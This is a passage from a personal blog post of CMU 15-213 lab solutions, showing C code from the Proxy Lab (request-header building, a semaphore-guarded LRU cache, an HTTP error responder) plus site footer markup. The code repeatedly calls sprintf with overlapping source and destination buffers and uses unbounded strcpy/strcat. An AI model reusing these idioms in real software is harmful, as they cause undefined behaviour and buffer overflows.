{</span><br><span class="line">			<span class="built_in">strcpy</span> (host, t_buf);</span><br><span class="line">		} <span class="keyword">else</span> {</span><br><span class="line">			<span class="built_in">strcat</span> (remaining, t_buf);</span><br><span class="line">		}</span><br><span class="line">		Rio_readlineb (rp, t_buf, MAXLINE);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span> (buf, <span class="string">"%s"</span>, req);</span><br><span class="line">	<span class="built_in">sprintf</span> (buf, <span class="string">"%s%s"</span>, buf, host);</span><br><span class="line">	<span class="built_in">sprintf</span> (buf, <span class="string">"%s%s"</span>, buf, user_agent_hdr);</span><br><span class="line">	<span class="built_in">sprintf</span> (buf, <span class="string">"%s%s"</span>, buf, connection_hdr);</span><br><span class="line">	<span class="built_in">sprintf</span> (buf, <span class="string">"%s%s"</span>, buf, proxy_hdr);</span><br><span class="line">	<span class="built_in">sprintf</span> (buf, <span class="string">"%s%s"</span>, buf, remaining);</span><br><span class="line">	<span class="built_in">sprintf</span> (buf, <span class="string">"%s\r\n"</span>, buf);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cache_init</span> <span class="params">(<span class="type">cache_t</span> *caches, <span class="type">int</span> cache_cnt)</span></span><br><span class="line">{</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache_cnt; ++i) {</span><br><span class="line">		caches[i].buf_size = <span class="number">0</span>;</span><br><span class="line">		caches[i].read_cnt = <span class="number">0</span>;</span><br><span class="line">		caches[i].stamp    = <span class="number">0</span>;</span><br><span class="line">		Sem_init (&amp;caches[i].mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">		Sem_init (&amp;caches[i].write, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cache_read</span> <span class="params">(<span class="type">cache_t</span> *cache, <span class="type">char</span> *buf)</span> </span><br><span class="line">{</span><br><span class="line">	P (&amp;cache-&gt;mutex);</span><br><span class="line">	cache-&gt;read_cnt++;</span><br><span class="line">	<span class="keyword">if</span> (cache-&gt;read_cnt == <span class="number">1</span>)</span><br><span class="line">		P (&amp;cache-&gt;write);</span><br><span class="line">	V (&amp;cache-&gt;mutex);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">strncpy</span> (buf, cache-&gt;buf, cache-&gt;buf_size);</span><br><span class="line">	cache_update (caches, MAX_CACHE_BLK, cache);</span><br><span class="line"></span><br><span class="line">	P (&amp;cache-&gt;mutex);</span><br><span class="line">	cache-&gt;read_cnt--;</span><br><span class="line">	<span class="keyword">if</span> (cache-&gt;read_cnt == <span class="number">0</span>)</span><br><span class="line">		V (&amp;cache-&gt;write);</span><br><span class="line">	V (&amp;cache-&gt;mutex);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> cache-&gt;buf_size;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cache_write</span> <span class="params">(<span class="type">cache_t</span> *cache, <span class="type">char</span> *uri, <span class="type">char</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">{</span><br><span class="line">	P (&amp;cache-&gt;write);</span><br><span class="line">	<span class="built_in">strcpy</span> (cache-&gt;uri, uri);</span><br><span class="line">	<span class="built_in">strcpy</span> (cache-&gt;buf, buf);</span><br><span class="line">	cache-&gt;buf_size = size;</span><br><span class="line">	cache_update (caches, MAX_CACHE_BLK, cache);</span><br><span class="line">	V (&amp;cache-&gt;write);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cache_latest</span> <span class="params">(<span class="type">cache_t</span> *caches, <span class="type">int</span> cache_cnt)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> latest = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache_cnt; ++i) {</span><br><span class="line">		<span class="keyword">if</span> (caches[i].stamp &lt; latest) </span><br><span class="line">			latest = caches[i].stamp;</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">return</span> latest;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cache_search</span> <span class="params">(<span class="type">cache_t</span> *caches, <span class="type">int</span> cache_cnt, <span class="type">char</span> *uri)</span></span><br><span class="line">{</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache_cnt; ++i)</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span> (caches[i].uri, uri))</span><br><span class="line">			<span class="keyword">return</span> i;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cache_update</span> <span class="params">(<span class="type">cache_t</span> *caches, <span class="type">int</span> cache_cnt, <span class="type">cache_t</span> *cache)</span></span><br><span class="line">{</span><br><span class="line">	cache-&gt;stamp = cache_latest (caches, cache_cnt) - <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cache_evict</span> <span class="params">(<span class="type">cache_t</span> *caches, <span class="type">int</span> cache_cnt)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> least_stamp = caches[<span class="number">0</span>].stamp;</span><br><span class="line">	<span class="type">int</span> least_idx = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache_cnt; ++i) {</span><br><span class="line">		<span class="keyword">if</span> (caches[i].stamp == <span class="number">0</span>) {</span><br><span class="line">			<span class="keyword">return</span> i;</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">if</span> (caches[i].stamp &gt; least_stamp) {</span><br><span class="line">			least_stamp = caches[i].stamp;</span><br><span class="line">			least_idx = i;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">return</span> least_idx;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clienterror</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *cause, <span class="type">char</span> *errnum, <span class="type">char</span> *shortmsg, <span class="type">char</span> *longmsg)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Print the HTTP response headers */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"HTTP/1.0 %s %s\r\n"</span>, errnum, shortmsg);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"Content-type: text/html\r\n\r\n"</span>);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Print the HTTP response body */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"&lt;html&gt;&lt;title&gt;Tiny Error&lt;/title&gt;"</span>);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"&lt;body bgcolor="</span><span class="string">"ffffff"</span><span class="string">"&gt;\r\n"</span>);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"%s: %s\r\n"</span>, errnum, shortmsg);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"&lt;p&gt;%s: %s\r\n"</span>, longmsg, cause);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"&lt;hr&gt;&lt;em&gt;The Tiny Web server&lt;/em&gt;\r\n"</span>);</span><br><span class="line">    Rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/resources/">Resources</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-1-data-lab"><span class="toc-number">1.</span> <span class="toc-text">Lab 1: Data Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-2-bomb-lab"><span class="toc-number">2.</span> <span class="toc-text">Lab 2: Bomb Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-3-attack-lab"><span class="toc-number">3.</span> <span class="toc-text">Lab 3: Attack Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-4-cache-lab"><span class="toc-number">4.</span> <span class="toc-text">Lab 4: Cache Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-5-performance-lab"><span class="toc-number">5.</span> <span class="toc-text">Lab 5: Performance Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-6-shell-lab"><span class="toc-number">6.</span> <span class="toc-text">Lab 6: Shell Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-7-malloc-lab"><span class="toc-number">7.</span> <span class="toc-text">Lab 7: Malloc Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-8-proxy-lab"><span class="toc-number">8.</span> <span class="toc-text">Lab 8: Proxy Lab</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://sulley.cc/2024/09/01/20/06/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://sulley.cc/2024/09/01/20/06/&text=Solutions to CMU 15213 Labs"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://sulley.cc/2024/09/01/20/06/&is_video=false&description=Solutions to CMU 15213 Labs"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Solutions to CMU 15213 Labs&body=Check out this article: http://sulley.cc/2024/09/01/20/06/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://sulley.cc/2024/09/01/20/06/&name=Solutions to CMU 15213 Labs&description=&lt;p&gt;This post is an archive for my personal solutions to the ten labs for
the CMU 15213 course. You can access the self-study labs at the CSAPP
official &lt;a href=&#34;https://csapp.cs.cmu.edu/3e/labs.html&#34;&gt;website&lt;/a&gt;.&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://sulley.cc/2024/09/01/20/06/&t=Solutions to CMU 15213 Labs"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2025
    Sulley
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/resources/">Resources</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
